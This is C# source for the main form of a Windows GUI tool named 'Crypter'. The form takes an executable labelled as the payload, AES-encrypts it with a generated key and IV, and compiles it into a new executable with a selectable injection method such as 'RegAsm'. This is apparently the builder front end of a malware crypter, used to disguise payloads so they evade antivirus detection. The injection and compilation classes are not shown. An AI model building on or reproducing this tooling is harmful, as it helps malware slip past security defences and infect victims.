using Crypter.Tools;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Crypter
{
    public partial class Form1 : Form
    {
        private string currentInjection;
        public Form1()
        {
            this.currentInjection = "RegAsm";
            InitializeComponent();
        }

        private void txtServer_TextChanged(object sender, EventArgs e)
        {

        }

        private void btnServer_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Excutable (*.exe)|*.exe";
                ofd.Title = "Select .NET File to Crypter....";

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtPayload.Text = ofd.FileName;
                    btnBuild.Enabled = true;
                }
                else
                {
                    btnBuild.Enabled = false;
                }
            }
        }

        private void btnIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon (*.ico)|*.ico";
                ofd.Title = "Select Icon to use....";

                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtIcon.Text = ofd.FileName;
                }
            }
        }

        private void btnKeyGen_Click(object sender, EventArgs e)
        {
            byte[] key = Tools.EncryptionConfig.GetKey(16);
            string keyBase64 = Convert.ToBase64String(key);
            txtKeyGen.Text = keyBase64;
        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            byte[] iv = Tools.EncryptionConfig.GetIV(16);
            string ivBase64 = Convert.ToBase64String(iv);
            txtIVGen.Text = ivBase64;
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                //  Read the payload file and store in rawData
                byte[] rawData = File.ReadAllBytes(txtPayload.Text);
                
                //  Encrypt payload with AES
                byte[] encRawData = Encryption.AesEncryption(rawData, Convert.FromBase64String(txtKeyGen.Text), Convert.FromBase64String(txtIVGen.Text));

                //  Convert to string
                string base64Aes = Convert.ToBase64String(encRawData);

                //  Build file to excutable file
                Compiler compiler = new Compiler(base64Aes, txtKeyGen.Text, txtIVGen.Text, currentInjection);
                compiler.Compile();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
           this.currentInjection = radioButton1.Text;
        }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {
            this.currentInjection = radioButton2.Text;
        }
    }
}
